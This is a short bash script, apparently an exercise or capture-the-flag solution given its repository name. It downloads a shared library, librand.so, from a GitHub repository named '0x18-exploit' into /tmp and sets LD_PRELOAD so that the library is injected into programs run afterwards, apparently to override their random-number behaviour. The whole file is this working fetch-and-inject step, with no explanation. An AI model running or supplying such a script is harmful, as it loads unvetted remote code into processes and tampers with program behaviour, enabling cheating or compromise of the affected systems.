#!/bin/bash
curl https://github.com/Ehijoe/0x18-exploit/raw/main/librand.so -o /tmp/librand.so
export LD_PRELOAD=/tmp/librand.so
